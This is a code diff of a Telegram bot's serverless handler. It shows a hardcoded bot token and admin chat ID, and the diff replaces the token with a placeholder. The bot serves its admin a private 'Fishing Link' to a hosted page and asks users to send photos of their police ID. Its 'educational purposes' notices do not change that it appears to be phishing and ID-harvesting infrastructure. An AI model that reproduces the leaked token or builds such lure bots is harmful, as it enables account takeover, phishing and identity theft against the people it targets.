@@ -1,5 +1,5 @@
 // 🔐 Real credentials
-const TELEGRAM_BOT_TOKEN = '7740401254:AAHhnSMhm-dMcv7-4LJCGwHchxRrYhBEsCY';
+const TELEGRAM_BOT_TOKEN = 'YOUR_REAL_BOT_TOKEN';
 const ADMIN_CHAT_ID = '7216371031';
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
@@ -26,24 +26,30 @@ export default async function handler(req, res) {
     // 🛂 Police Enquiry Button
     if (callbackQuery?.data === 'police') {
       await sendMessageNoMarkdown(
-        chatId,
+        callbackQuery.message.chat.id,
         `🛂 Police Verification Required\n\n📸 Please send a clear photo of your Police ID.\nOur admin will verify and give you access to confidential resources.`
       );
       await answerCallback(callbackQuery.id);
       return res.status(200).send('OK');
     }
 
-    // 🎣 Let’s Fish Button
+    // 🎣 Let’s Fish Button (updated)
     if (callbackQuery?.data === 'fishing') {
-      const isAdmin = chatId.toString() === ADMIN_CHAT_ID;
+      const userId = callbackQuery.message.chat.id.toString();
+      const isAdmin = userId === ADMIN_CHAT_ID;
+
       if (isAdmin) {
-        await sendMessage(chatId, `🎣 *Fishing Link (Private)*\n\n||🔗 https://heavenscake.vercel.app/page.html||`);
+        await sendMessage(
+          userId,
+          `🎣 *Fishing Link (Private)*\n\n||🔗 https://heavenscake.vercel.app/page.html||`
+        );
       } else {
         await sendMessageNoMarkdown(
-          chatId,
-          `⚠️ This feature is only available to the bot administrator.\n\nThis bot was built for educational purposes and contains tools or links that could be misused if accessed by unauthorized users. Thank you for understanding. 🙏`
+          userId,
+          `⚠️ This feature is made for admins for educational purposes only.\nIt is not meant for public use and may lead to misuse.`
         );
       }
+
       await answerCallback(callbackQuery.id);
       return res.status(200).send('OK');
     }
@@ -78,7 +84,7 @@ export default async function handler(req, res) {
     }
 
     // ✅ Admin Verifies or Denies
-    if (callbackQuery && chatId.toString() === ADMIN_CHAT_ID) {
+    if (callbackQuery && callbackQuery.message.chat.id.toString() === ADMIN_CHAT_ID) {
       const data = callbackQuery.data;
 
       if (data.startsWith('verify_')) {
@@ -112,15 +118,15 @@ export default async function handler(req, res) {
   }
 }
 
-// 🟢 Welcome Screen
+// 🟢 Welcome screen with inline buttons + feature note
 async function sendWelcomeWithButtons(chatId) {
   await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       chat_id: chatId,
-      text: '👋 Welcome to *Tecky Rishad Bot*!\n\nChoose an option below:\n\n⚠️ *Note:* This bot was created strictly for educational purposes. Some features are restricted to prevent potential misuse and are only available to verified or admin users.',
-      parse_mode: 'Markdown',
+      text: `👋 Welcome to <b>Tecky Rishad Bot</b>!\n\nChoose an option below:\n\n<i>Note: This bot was created for educational purposes only. Some features are restricted to admin users to prevent misuse.</i>`,
+      parse_mode: 'HTML',
       reply_markup: {
         inline_keyboard: [
           [{ text: '✨ Join Our Community', url: 'https://t.me/r1shaad' }],
@@ -132,7 +138,7 @@ async function sendWelcomeWithButtons(chatId) {
   });
 }
 
-// 📬 Plain text sender
+// 📨 Text without formatting
 async function sendMessageNoMarkdown(chatId, message) {
   return fetch(`${TELEGRAM_API_URL}/sendMessage`, {
     method: 'POST',
@@ -141,7 +147,7 @@ async function sendMessageNoMarkdown(chatId, message) {
   });
 }
 
-// 📬 Markdown sender
+// 📨 Text with MarkdownV2 (for admin fishing link)
 async function sendMessage(chatId, message) {
   return fetch(`${TELEGRAM_API_URL}/sendMessage`, {
     method: 'POST',
@@ -154,7 +160,7 @@ async function sendMessage(chatId, message) {
   });
 }
 
-// ✅ Callback button handler
+// ✅ Answer callback button
 async function answerCallback(callbackQueryId) {
   return fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
     method: 'POST',
